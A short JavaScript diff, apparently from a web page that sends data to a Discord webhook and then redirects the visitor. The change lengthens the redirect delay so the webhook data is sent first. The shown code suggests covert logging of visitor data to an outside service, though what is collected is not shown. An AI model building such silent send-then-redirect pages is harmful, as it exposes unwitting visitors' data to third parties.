@@ -103,11 +103,12 @@
                     console.error("Error sending message to Discord:", discordResponse.statusText);
                 }
 
-                // Step 6: Redirect after sending data
+                // Step 6: Delay the redirect to allow the data to be sent
+                console.log("Delaying redirect...");
                 setTimeout(() => {
                     console.log("Redirecting to URL...");
                     window.location.href = redirectURL;
-                }, 1000); // 1 second delay before redirecting
+                }, 3000); // 3-second delay to ensure the webhook data is sent before redirecting
 
             } catch (error) {
                 console.error("Error in logging or redirection:", error);
